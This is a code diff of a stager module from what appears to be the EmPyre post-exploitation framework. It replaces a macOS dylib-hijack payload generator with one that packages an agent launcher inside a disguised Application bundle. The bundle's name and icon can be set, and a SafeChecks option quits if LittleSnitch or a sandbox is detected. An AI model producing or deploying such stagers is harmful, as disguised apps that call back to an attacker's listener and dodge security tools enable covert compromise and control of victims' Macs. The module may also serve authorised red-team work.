@@ -1,16 +1,16 @@
 from lib.common import helpers
-import os
+
 
 class Stager:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'dylib',
+            'Name': 'Application',
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates a dylib.'),
+            'Description': ('Generates an EmPyre Application.'),
 
             'Comments': [
                 ''
@@ -31,40 +31,35 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'python'
             },
-            'Architecture' : {
-                'Description'   :   'Architecture: x86/x64',
+            'AppIcon' : {
+                'Description'   :   'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'AppName' : {
+                'Description'   :   'Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'OutFile' : {
+                'Description'   :   'path to output EmPyre application. The application will be saved to a zip file.',
                 'Required'      :   True,
-                'Value'         :   'x86'
+                'Value'         :   '/tmp/out.zip'
             },
             'SafeChecks' : {
                 'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
             },
-            'Hijacker' : {
-                'Description'   :   'Generate dylib to be used in a Dylib Hijack',
-                'Required'      :   True,
-                'Value'         :   'False'
-            },
-            'RPath' : {
-                'Description'   :   'Full path of the legitimate dylib as it would be on a target system.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'LocalLegitDylib' : {
-                'Description'   :   'Local path to the legitimate dylib used in the vulnerable application. Required if Hijacker is set to True.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'OutFile' : {
-                'Description'   :   'File to write the dylib.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'Architecture' : {
+                'Description'   :   'Architecture to use. x86 or x64',
+                'Required'      :   True,
+                'Value'         :   'x64'
             }
         }
 
@@ -79,37 +74,27 @@ class Stager:
                 self.options[option]['Value'] = value
 
     def generate(self):
+
         # extract all of our options
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
+        savePath = self.options['OutFile']['Value']
         userAgent = self.options['UserAgent']['Value']
+        SafeChecks = self.options['SafeChecks']['Value']
         arch = self.options['Architecture']['Value']
-        hijacker = self.options['Hijacker']['Value']
-        safeChecks = self.options['SafeChecks']['Value']
-        legitDylib = self.options['LocalLegitDylib']['Value']
-        rpath = self.options['RPath']['Value']
-
-        if arch == "":
-            print helpers.color("[!] Please select a valid architecture")
-            return ""
+        icnsPath = self.options['AppIcon']['Value']
+        AppName = self.options['AppName']['Value']
+        
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent,  safeChecks=safeChecks)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent, safeChecks=SafeChecks)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
 
         else:
+            disarm = False
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
-            dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
-            if hijacker.lower() == 'true' and os.path.exists(legitDylib):
-                f = open('/tmp/tmp.dylib', 'wb')
-                f.write(dylib)
-                f.close()
-
-                dylib = self.mainMenu.stagers.generate_dylibHijacker(attackerDylib="/tmp/tmp.dylib", targetDylib=legitDylib, LegitDylibLocation=rpath)
-                os.remove('/tmp/tmp.dylib')
-
-            return dylib
-
+            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName, disarm=disarm)
+            return ApplicationZip
